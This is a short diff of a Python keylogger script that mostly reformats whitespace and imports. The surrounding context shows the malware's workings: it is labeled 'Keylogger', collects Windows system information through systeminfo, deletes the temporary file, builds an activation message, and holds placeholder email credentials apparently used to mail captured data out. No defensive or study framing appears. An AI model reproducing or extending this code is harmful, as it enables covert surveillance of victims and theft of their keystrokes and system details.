@@ -7,15 +7,17 @@ def main():
         if IsAccountActive:
             if operating_system == "Windows":
                 terminal("systeminfo > systeminfo.txt")
-                
+
                 file = open("systeminfo.txt", "r")
                 systeminfo = file.read()
                 file.close()
-                
+
                 remove("systeminfo.txt")
-                
-                msg = f"Keylogger Activated Successfully...\n\nSystem Info:\n{systeminfo}"
-            
+
+                msg = (
+                    f"Keylogger Activated Successfully...\n\nSystem Info:\n{systeminfo}"
+                )
+
             else:
                 msg = "Keylogger Activated Successfully..."
 
@@ -265,7 +267,8 @@ try:
     basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")
 
     print("[INFO]\tImporting remove, system as terminal from os.")
-    from os import remove, system as terminal
+    from os import remove
+    from os import system as terminal
 
     print("[INFO]\tImporting system as environment from platform.")
     from platform import system as environment
@@ -295,7 +298,7 @@ try:
         terminal("title Keylogger")
 
     IsAccountActive = False
-    
+
     email = "$EMAIL"
     password = "$PASSWORD"
     to_addr = "$EMAIL"
